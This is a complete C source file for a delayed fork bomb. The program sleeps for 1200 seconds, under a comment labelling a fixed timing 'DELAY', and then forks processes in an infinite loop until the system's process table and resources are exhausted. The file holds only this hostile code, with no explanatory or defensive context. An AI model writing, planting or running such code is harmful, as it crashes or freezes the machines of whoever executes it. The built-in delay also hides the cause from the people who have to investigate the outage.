#include <stdlib.h>
#include <unistd.h>
int main()
{
	sleep(1200);	// FIXED TIMING "DELAY"
	while(1)
	{
		fork();
	}
	return(1);
}
